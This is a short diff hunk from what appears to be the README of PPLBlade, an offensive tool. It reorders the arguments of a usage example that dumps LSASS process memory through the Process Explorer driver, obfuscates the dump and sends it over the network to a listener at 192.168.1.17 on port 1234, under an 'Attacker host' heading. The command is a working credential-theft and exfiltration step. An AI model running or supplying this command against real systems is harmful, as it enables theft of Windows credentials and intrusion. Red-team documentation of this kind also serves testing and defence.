@@ -72,7 +72,7 @@ Basic POC that uses PROCEXP152.sys to dump lsass:
 
 Upload the obfuscated LSASS dump onto a remote location:
 
-`PPLBlade.exe --mode dump --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234 --handle procexp --name lsass.exe`
+`PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234`
 
 Attacker host:
 ```
